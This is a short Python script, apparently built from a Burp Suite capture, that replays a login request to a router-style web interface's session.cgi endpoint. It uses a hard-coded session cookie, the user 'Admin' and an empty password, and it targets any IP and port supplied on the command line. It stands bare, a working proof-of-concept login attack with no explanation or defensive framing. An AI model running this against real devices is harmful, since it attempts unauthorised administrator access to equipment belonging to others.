import argparse
import requests

def replay_login(ip, port):
    burp0_url = f"http://{ip}:{port}/session.cgi"
    burp0_cookies = {"uid": "EuoojdOlLc"}
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{ip}",
        "Connection": "close",
        "Referer": f"http://{ip}"
    }
    burp0_data = {
        "REPORT_METHOD": "xml",
        "ACTION": "login_plaintext",
        "USER": "Admin",
        "PASSWD": '',
        "CAPTCHA": ''
    }
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Replay login script')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', required=True, help='Target port')
    args = parser.parse_args()
    replay_login(args.ip, args.port)
